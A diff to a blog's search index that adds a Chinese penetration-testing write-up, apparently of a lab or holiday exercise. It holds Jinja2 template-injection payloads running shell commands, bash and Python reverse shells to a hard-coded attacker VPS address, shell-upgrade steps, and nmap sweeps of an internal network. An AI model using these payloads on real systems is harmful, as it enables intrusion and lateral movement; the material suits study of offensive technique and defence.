@@ -9227,25 +9227,48 @@ ab\,mod(2^{31}-1) &= a(2^{i}+2^{j}+2^k)\,mod\,m\\
     <title>渗透测试-欧拉</title>
     <url>/2023/01/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/index.html</url>
     <content><![CDATA[<!--toc-->
-
 <p>过年的一次内网渗透</p>
 <span id="more"></span>
-
-
-
-<h4 id="an-zhuang-nps"><a href="#安装-nps" class="headerlink" title="安装 nps"></a>安装 nps<a href="#an-zhuang-nps" class="header-anchor">#</a></h4><p>把vps服务器的流量转到我们的本地kali上来。</p>
+<h3 id="wai-wang-da-dian"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点<a href="#wai-wang-da-dian" class="header-anchor">#</a></h3><p><img src="/images/渗透测试-欧拉/image-20230122213642062.png" alt="image-20230122213642062"></p>
+<p><img src="/images/渗透测试-欧拉/image-20230122213728216.png" alt="image-20230122213728216"></p>
+<p>尝试模板注入：</p>
+<p><img src="/images/渗透测试-欧拉/image-20230122213746182.png" alt="image-20230122213746182"></p>
+<p>确认存在SSTI，网上找个payload试试：<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---remote-code-execution">SSTI</a></p>
+<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123; <span class="name">self._TemplateReference__context.cycler.__init__.__globals__.os.popen</span>(<span class="name">&#x27;id&#x27;</span>).read() &#125;&#125;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/渗透测试-欧拉/image-20230122213851444.png" alt="image-20230122213851444"></p>
+<p>root 权限！尝试弹 shell 吧</p>
+<p>有以下两种方式：</p>
+<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123; <span class="name">self._TemplateReference__context.cycler.__init__.__globals__.os.popen</span>(<span class="name">request.args.xxx</span>).read() &#125;&#125;</span><span class="language-xml">&amp;xxx=curl baidu.com //先用baidu.com测试一下命令是否成功执行以及机器能否出网，之后换成反弹shell的命令就好</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/渗透测试-欧拉/image-20230122214203550.png" alt="image-20230122214203550"></p>
+<p>可以看到这台机器是可以出网的，接下来我们直接弹 shell，不过在那之前先使用 nps 给我们本地的kali弄一个端口转发</p>
+<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">self._TemplateReference__context.cycler.__init__.__globals__.os.popen</span>(<span class="name">request.args.xxx</span>).read()&#125;&#125;</span><span class="language-xml">&amp;xxx=bash -c &quot;bash -i &gt;&amp; /dev/tcp/47.115.222.18/12345 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
+<p>糟糕地是，我的vps好像用不了上面的方法，直接用python反弹shell</p>
+<figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">http://121.37.186.22/?name=</span><span class="template-variable">&#123;&#123;url_for.__globals__.os.__dict__.popen(<span class="string">&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;</span><span class="number">47</span>.<span class="number">115</span>.<span class="number">222</span>.<span class="number">18</span>\<span class="string">&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;</span>/bin/sh\<span class="string">&quot;,\&quot;</span>-i\<span class="string">&quot;]);&#x27;&quot;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+<p>反弹之后运行如下命令模拟一个终端设备</p>
+<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">python -<span class="keyword">c</span> <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">nc -lvp 12345</span><br><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">ctrl z</span><br><span class="line">stty<span class="built_in"> raw </span>-echo</span><br><span class="line">fg</span><br><span class="line"><span class="built_in">export</span> <span class="attribute">TERM</span>=xterm</span><br></pre></td></tr></table></figure>
+<p>成功拿下第一台靶机</p>
+<p><img src="/images/渗透测试-欧拉/image-20230122221102357.png" alt="image-20230122221102357"></p>
+<p>看一下这台机器的网络</p>
+<p><img src="/images/渗透测试-欧拉/image-20230122221158065.png" alt="image-20230122221158065"></p>
+<p>传一个 nmap 上去对内网的其他主机进行扫描，用到的 nmap 来自<a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap">andrew-d</a></p>
+<p>这里同样再开一个 nps 代理（端口8001），先将 nmap 下载到本地的 kali，然后直接让这台机器 curl 我们的 vps 就可以了。具体操作如下</p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> ~</span><br><span class="line"><span class="built_in">mkdir</span> www</span><br><span class="line"><span class="keyword">cd</span> www</span><br><span class="line"><span class="keyword">cp</span> ../npc npc</span><br><span class="line"><span class="keyword">cp</span> ../<span class="keyword">nmap</span> <span class="keyword">nmap</span></span><br><span class="line"><span class="keyword">python</span> -<span class="keyword">m</span> http.server <span class="number">8001</span></span><br></pre></td></tr></table></figure>
+<h4 id="an-zhuang-nps"><a href="#安装-nps" class="headerlink" title="安装 nps"></a>安装 nps<a href="#an-zhuang-nps" class="header-anchor">#</a></h4><p>把 vps 服务器的流量转到我们的本地kali上来。</p>
 <p><a href="https://www.moewah.com/archives/842.html">https://www.moewah.com/archives/842.html</a></p>
 <h3 id="ru-he-huo-qu-dao-yi-ge-zhen-zheng-de-shell-zhong-duan"><a href="#如何获取到一个真正的shell终端" class="headerlink" title="如何获取到一个真正的shell终端"></a>如何获取到一个真正的shell终端<a href="#ru-he-huo-qu-dao-yi-ge-zhen-zheng-de-shell-zhong-duan" class="header-anchor">#</a></h3><p><a href="http://www.manongjc.com/detail/50-xutpevrxkczwyvh.html">http://www.manongjc.com/detail/50-xutpevrxkczwyvh.html</a></p>
-<p><a href="https://blog.csdn.net/qq_40572277/article/details/104990616?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-104990616-blog-126389028.pc_relevant_3mothn_strategy_recovery&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-104990616-blog-126389028.pc_relevant_3mothn_strategy_recovery&utm_relevant_index=1">Linux中使用ctrl+z停止任务后如何恢复任务</a></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">nc -lvp 9001</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">ctrl Z</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span></span><br><span class="line"><span class="built_in">fg</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line"><span class="built_in">stty</span> rows xx columns xxx</span><br><span class="line">reset</span><br></pre></td></tr></table></figure>
-
-
-
+<p><a href="https://blog.csdn.net/qq_40572277/article/details/104990616?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-104990616-blog-126389028.pc_relevant_3mothn_strategy_recovery&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-104990616-blog-126389028.pc_relevant_3mothn_strategy_recovery&amp;utm_relevant_index=1">Linux中使用ctrl+z停止任务后如何恢复任务</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash //一定要进bash！</span><br><span class="line">nc -lvp 9001</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">ctrl Z</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span></span><br><span class="line"><span class="built_in">fg</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line"><span class="built_in">stty</span> rows xx columns xxx</span><br><span class="line">reset</span><br></pre></td></tr></table></figure>
 <h4 id="python-fan-dan-shell"><a href="#python-反弹shell" class="headerlink" title="python 反弹shell"></a>python 反弹shell<a href="#python-fan-dan-shell" class="header-anchor">#</a></h4><figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">http://121.37.186.22/?name=</span><span class="template-variable">&#123;&#123;url_for.__globals__.os.__dict__.popen(<span class="string">&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;</span><span class="number">47</span>.<span class="number">115</span>.<span class="number">222</span>.<span class="number">18</span>\<span class="string">&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;</span>/bin/sh\<span class="string">&quot;,\&quot;</span>-i\<span class="string">&quot;]);&#x27;&quot;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="dang-qian-ip"><a href="#当前ip" class="headerlink" title="当前ip"></a>当前ip<a href="#dang-qian-ip" class="header-anchor">#</a></h5><p><img src="/../images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230120181158143.png" alt="image-20230120181158143"></p>
+<h5 id="dang-qian-ip"><a href="#当前ip" class="headerlink" title="当前ip"></a>当前ip<a href="#dang-qian-ip" class="header-anchor">#</a></h5><p><img src="/images/渗透测试-欧拉/image-20230120181158143.png" alt="image-20230120181158143"></p>
 <h5 id="nei-he-xin-xi"><a href="#内核信息" class="headerlink" title="内核信息"></a>内核信息<a href="#nei-he-xin-xi" class="header-anchor">#</a></h5><p>发现是红帽</p>
-<p><img src="/../images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230120181322429.png" alt="image-20230120181322429"></p>
+<p><img src="/images/渗透测试-欧拉/image-20230120181322429.png" alt="image-20230120181322429"></p>
+<h3 id="nmap-sao-miao-nei-wang-cun-huo-zhu-ji"><a href="#nmap扫描内网存活主机" class="headerlink" title="nmap扫描内网存活主机"></a>nmap扫描内网存活主机<a href="#nmap-sao-miao-nei-wang-cun-huo-zhu-ji" class="header-anchor">#</a></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> logs</span><br><span class="line">./nmap -sP -oA logs/alive 10.10.10.1/24</span><br></pre></td></tr></table></figure>
+<p><img src="/images/渗透测试-欧拉/image-20230122232232261.png" alt="image-20230122232232261"></p>
+<p>之后对存活的主机分别进行扫描</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">.<span class="regexp">/nmap -v --min-rate=10000 -oA logs/</span><span class="number">10.101</span> <span class="number">10.10</span>.<span class="number">10.101</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/images/渗透测试-欧拉/image-20230122232533975.png" alt="image-20230122232533975"></p>
+<p>80 是 http 服务器，设置一下 kali 的 burp ，让它走socks代理，然后burp再代理浏览器，这样就可以通过浏览器访问 10.10.10.101 了。</p>
 <h3 id="can-kao-lian-jie"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接<a href="#can-kao-lian-jie" class="header-anchor">#</a></h3><p><a href="https://www.freebuf.com/articles/web/332083.html">Linux内网渗透——Linux信息收集与横向移动 - FreeBuf网络安全行业门户</a></p>
 ]]></content>
       <categories>
